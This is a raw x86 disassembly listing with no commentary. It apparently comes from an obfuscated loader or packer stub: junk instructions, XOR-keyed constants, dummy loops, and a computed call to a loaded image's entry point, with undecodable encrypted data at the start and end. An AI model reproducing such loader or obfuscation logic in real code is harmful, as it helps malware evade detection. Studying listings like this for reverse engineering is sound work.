  40d765:	imul   esi,DWORD PTR [edi],0xffffffdc
  40d768:	inc    eax
  40d769:	in     al,0x97
  40d76b:	and    ah,BYTE PTR [edx-0x5f]
  40d76e:	mov    cl,0x80
  40d770:	xor    dh,BYTE PTR [edi+edi*4-0x2a247e76]
  40d777:	mov    bl,0x26
  40d779:	mov    edx,0xccb20ed8
  40d77e:	xchg   edx,eax
  40d77f:	pop    ebx
  40d780:	mov    edx,0xf1acd433
  40d785:	in     al,dx
  40d786:	jno    0x40d74c
  40d788:	pop    esi
  40d789:	pop    ecx
  40d78a:	fcomp  DWORD PTR [ecx]
  40d78c:	xchg   esp,eax
  40d78d:	dec    eax
  40d78e:	fidivr WORD PTR [ebp+0x2b3792a5]
  40d794:	add    ecx,DWORD PTR [ebp+edx*2-0xc0d3392]
  40d79b:	shr    BYTE PTR [ecx-0x7a5652f8],1
  40d7a1:	mov    bh,0x5e
  40d7a3:	jmp    0x40d7d5
  40d7a5:	sub    eax,0xb442bac6
  40d7aa:	shr    DWORD PTR [ebx],1
  40d7ac:	mov    esp,0x9d3a74d9
  40d7b1:	data16 clc 
  40d7b3:	mov    al,0x98
  40d7b5:	push   esi
  40d7b6:	lods   al,BYTE PTR ds:[esi]
  40d7b7:	xchg   ebx,eax
  40d7b8:	and    eax,0x49b39204
  40d7bd:	stc    
  40d7be:	addr16 addr16 push ds
  40d7c1:	pop    ss
  40d7c2:	fnstcw WORD PTR [edx-0x2a0a92ae]
  40d7c8:	je     0x40d824
  40d7ca:	and    edx,ecx
  40d7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7cd:	sub    edi,DWORD PTR [ecx+0x1a590852]
  40d7d3:	jmp    0x40d7b9
  40d7d5:	scas   al,BYTE PTR es:[edi]
  40d7d6:	ds mov bh,0xdb
  40d7d9:	add    DWORD PTR [ebx-0x64],0x233466fd
  40d7e0:	add    eax,0xb37fab42
  40d7e5:	jb     0x40d7bd
  40d7e7:	aas    
  40d7e8:	mov    es,WORD PTR [ecx+0x6a]
  40d7eb:	fcmovbe st,st(7)
  40d7ed:	pop    ecx
  40d7ee:	push   esp
  40d7ef:	or     edi,ebx
  40d7f1:	add    bh,BYTE PTR [bp+di]
  40d7f4:	icebp  
  40d7f5:	mov    esi,?
  40d7f7:	xchg   ebx,eax
  40d7f8:	ja     0x40d82c
  40d7fa:	mov    eax,ds:0x83c3d3e
  40d7ff:	dec    ecx
  40d800:	fild   QWORD PTR [esi-0x21]
  40d803:	and    al,0x9c
  40d805:	pop    ds
  40d806:	mov    edi,0x2a5b11ec
  40d80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d80c:	mov    ecx,0x65c23614
  40d811:	inc    ebp
  40d812:	jo     0x40d83c
  40d814:	ins    BYTE PTR es:[edi],dx
  40d815:	pop    edi
  40d816:	nop
  40d817:	imul   ebx,DWORD PTR [esi+0x5f],0xffffffd7
  40d81b:	sub    DWORD PTR [eax+eax*8-0xd],esp
  40d81f:	jbe    0x40d7fa
  40d821:	cmp    BYTE PTR [edi+0x28],bl
  40d824:	(bad)  
  40d826:	icebp  
  40d827:	pop    es
  40d828:	je     0x40d7d0
  40d82a:	xor    al,BYTE PTR [edx+0x35ff21c8]
  40d830:	adc    al,0xb7
  40d832:	ror    DWORD PTR [edi],cl
  40d834:	add    BYTE PTR [esi-0x3c],0xeb
  40d838:	or     DWORD PTR [eax],ecx
  40d83a:	push   ecx
  40d83b:	add    BYTE PTR [ecx],bh
  40d83d:	popa   
  40d83e:	cdq    
  40d83f:	dec    eax
  40d840:	jbe    0x40d80b
  40d842:	jns    0x40d880
  40d844:	add    al,0x2a
  40d846:	sub    ch,bl
  40d848:	and    dh,BYTE PTR [ebx+0x79]
  40d84b:	cwde   
  40d84c:	(bad)  
  40d84e:	pop    ebp
  40d84f:	push   ds
  40d850:	pop    ebp
  40d851:	jmp    0x5fdfec82
  40d856:	popf   
  40d857:	inc    esp
  40d858:	pushf  
  40d859:	lods   eax,DWORD PTR ds:[esi]
  40d85a:	cmc    
  40d85b:	and    eax,0x853e59d2
  40d860:	sbb    eax,0x697ee0c0
  40d865:	push   ebx
  40d866:	addr16 pop es
  40d868:	adc    eax,0xba9c77f4
  40d86d:	mov    gs,WORD PTR ds:0x35456b9
  40d873:	jge    0x40d865
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x21252fbc]
  40e122:	or     BYTE PTR [eax+0x68],bh
  40e125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e126:	jo     0x40e198
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e0b5
  40e12d:	fsubp  st(7),st
  40e12f:	add    BYTE PTR [edi-0x3e5afbb8],dl
  40e135:	add    eax,0xb43e297b
  40e13a:	push   eax
  40e13b:	mov    ds:0x6a43f152,eax
  40e140:	mov    bl,0xb3
  40e142:	mov    cl,0x12
  40e144:	add    BYTE PTR [edi+0x7b7be98c],0x3a
  40e14b:	shl    DWORD PTR [edx],cl
  40e14d:	into   
  40e14e:	or     edi,DWORD PTR [eax]
  40e150:	test   eax,0xdf968191
  40e155:	(bad)  
  40e156:	shl    DWORD PTR [eax+0x5b915b2c],1
  40e15c:	xchg   edx,eax
  40e15d:	daa    
  40e15e:	jb     0x40e11b
  40e160:	data16 in al,0x83
  40e163:	mov    bh,0xde
  40e165:	adc    al,0xae
  40e167:	jae    0x40e0ff
  40e169:	mov    ds:0xe989c6bd,al
  40e16e:	cs aam 0xab
  40e171:	(bad)
  40e175:	inc    esp
  40e176:	rol    DWORD PTR [esi-0x7d040610],1
  40e17c:	add    BYTE PTR [ebx],dl
  40e17e:	mov    ebx,0xc699a2fa
  40e183:	retf   0xc74a
  40e186:	arpl   WORD PTR [esi],sp
  40e188:	add    bh,BYTE PTR [ebp+0x3d]
  40e18b:	and    eax,0xae2dcda9
  40e190:	(bad)  
  40e191:	mov    ds:0xf653b683,eax
  40e196:	in     al,0x13
  40e198:	and    ecx,esi
  40e19a:	stos   DWORD PTR es:[edi],eax
  40e19b:	(bad)  
  40e19c:	rcr    DWORD PTR [esi+ecx*2],1
  40e19f:	sbb    bl,BYTE PTR [ebp+esi*4+0x460822fe]
  40e1a6:	loop   0x40e144
  40e1a8:	jb     0x40e16f
  40e1aa:	inc    edx
  40e1ab:	mov    dl,0x87
  40e1ad:	fst    DWORD PTR [esi-0x3066e361]
  40e1b3:	pop    edx
  40e1b4:	push   edx
  40e1b5:	fs cli 
  40e1b7:	xor    ah,BYTE PTR [ecx]
  40e1b9:	pop    edi
  40e1ba:	call   0x450f3660
  40e1bf:	xor    al,0x1e
  40e1c1:	mov    ds,WORD PTR [edx]
  40e1c3:	dec    esi
